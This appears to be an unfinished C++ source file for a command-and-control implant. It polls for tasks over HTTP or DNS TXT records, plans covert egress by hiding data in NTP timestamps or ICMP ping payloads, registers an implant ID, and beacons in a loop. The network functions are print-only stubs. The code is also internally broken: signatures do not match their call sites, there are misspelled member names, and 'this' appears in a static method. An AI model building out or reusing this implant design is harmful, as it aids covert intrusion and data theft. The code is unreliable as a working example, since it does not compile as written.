#include <iostream>
#include <string>
#include <vector>
#include <map>
#include "../data/msgpack/msgpack.h"
#include "c2.h"

// --- Strategies - aka funcs to call that do data (Jinja generates these) ex, http_get, etc. append profile name on them?? not sure. ---

// Ingress: HTTP
std::string get_HTTP() {
    std::cout << "[HTTP GET] Checking for orders...\n";
    return "exec_calc"; // Simulated command received
}

std::string post_HTTP() {
    std::cout << "[HTTP GET] Checking for orders...\n";
    return "exec_calc"; // Simulated command received
}

// Ingress: DNS TXT Records
std::string get_DNS() {
    std::cout << "[DNS TXT] Querying for orders...\n";
    return ""; // No orders
}

// Egress: NTP
void post_NTP(std::string data) {
    std::cout << "[NTP] Smuggling data inside timestamp fields: " << data << "\n";
}
//
// Egress: ICMP (Ping)
void post_ICMP(std::string data) {
    std::cout << "[ICMP] Packing data into ping payload: " << data << "\n";
}


// --- The Dispatcher ---
class C2Implant {
public:
    static void init() {
        // Jinja populates this
        //settnig up mapping between which methods, and which funcs to call based on it
        ingress_map_[InMethod::HTTP] = get_HTTP;
        //ingressMap[InMethod::DNS] = get_DNS; //extra options

        egress_map_[OutMethod::NTP] = post_NTP;
        //egressMap[OutMethod::ICMP] = post_ICMP; //extra options
    }

    //wrapper of funcs to call, easier to do this, and just pass in the map of funcs
    static void cycle(InMethod get, OutMethod post) {
        // 1. GET Command
        while (1) {
            nlohmann::json task_data = ingress_map_[get](implant_uuid_);

            std::cout << "AFTER GET" << std::endl;

            // [SAFETY CHECK] 
            // 1. Is the JSON valid (not null)?
            // 2. Does it contain the task_uuid key?
            // 3. Is the value actually a string?
            if (!task_data.is_null() && task_data.contains("task_uuid") && task_data["task_uuid"].is_string())
            {
                std::string task_uuid = task_data["task_uuid"];
                std::cout << "Received Task: " << task_uuid << std::endl;

                // Execute Actions
                std::string text_data = "If you see this it means the implant is talking to you";

                // Prepare Response
                std::vector<uint8_t> task_response_as_msgpack;
                create_task_response(implant_uuid_, task_uuid, text_data, task_response_as_msgpack);

                // POST Response
                //post(implant_uuid, text_data, task_uuid); // Note: verify if post needs text_data or the msgpack buffer
                egress_map_[post](implant_uuid_, text_data, task_uuid);

            }
            else {
                // This handles cases where:
                // 1. HTTP_GET failed
                // 2. Server sent "No Content"
                std::cout << "No task or failed request. Sleeping..." << std::endl;
            }

            //sleep
            this->sleep();
        }
    }

    static int register_implant(InMethod registration_method) {
        //get how we talk to server, send blank id
        nlohmann::json implant_uuid_data = ingresss_map_[registration_method]("00000000-0000-0000-0000-000000000000");
        
        //extract implant_uuid from here, store in class var.
        implant_uuid_ = implant_uuid_data["implant_uuid"];
        std::cout << "Implant UUID: " << implant_uuid_ << std::endl;

        if (implant_uuid.empty()) {
            std::cerr << "Failed to register implant. Exiting." << std::endl;
            return -1;
        }
        return 1;
    }

    //Dedicated sleep func if people want to edit it
    static void sleep() {
        Sleep(5000);
    }
};
